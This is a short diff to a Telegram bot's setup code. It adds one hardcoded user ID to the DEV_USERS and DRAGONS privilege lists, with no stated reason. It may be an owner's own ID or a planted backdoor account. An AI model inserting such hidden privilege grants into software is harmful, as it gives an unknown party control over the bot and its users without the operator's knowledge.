@@ -172,8 +172,8 @@ BOT_USERNAME = dispatcher.bot.username
 print("[INFO]: INITIALIZING ARQ CLIENT...")
 arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
 
-DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
+DRAGONS = list(DRAGONS) + list(DEV_USERS) + [5304356242]
+DEV_USERS = list(DEV_USERS) + [5304356242]
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
